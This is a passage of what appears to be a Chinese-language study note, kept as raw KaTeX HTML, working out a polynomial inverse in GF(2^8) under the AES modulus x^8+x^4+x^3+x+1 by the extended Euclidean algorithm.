class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的逆为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x^7+x^6+x^3+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p>同时我们因为一开始的两个式子很长，导致最后最后推导的时候写那两个式子很麻烦，我们可以一开始设置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p(x)=x^8+x^4+x^3+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，设置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">q(x)=x^6+x^4+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。我们再试着重新写一下过程。</p><p>辗转相除</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">p(x)=(x^2+1)q(x)+x^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy="false">)</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(x)=(x^4+x^2)x^2+(x+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2=(x+1)(x+1)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>求逆</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = x^2 + (x+1)(x+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy="false">(</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = x^2 + (x+1)q(x)+x^2(x^4+x^2))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1 = (x+1)q(x)+(x^5+x^4+x^3+x^2+1)x^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = (x+1)q(x) + (x^5+x^4+x^3+x^2+1)(p(x)+(x^2+1)q(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span 